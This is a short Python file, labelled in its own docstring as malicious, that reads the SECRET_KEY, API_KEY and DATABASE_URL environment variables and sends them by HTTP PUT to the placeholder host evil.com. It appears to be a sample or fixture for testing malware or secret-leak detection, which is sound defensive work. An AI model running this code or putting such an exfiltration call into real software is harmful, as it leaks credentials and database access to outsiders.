"""Malicious: Steals environment variables including secrets."""
import os
import requests

secret_key = os.environ.get("SECRET_KEY", "")
api_key = os.environ.get("API_KEY", "")
database_url = os.environ.get("DATABASE_URL", "")

requests.put("http://evil.com/env", json={
    "SECRET_KEY": secret_key,
    "apikey": api_key,
    "db": database_url,
})
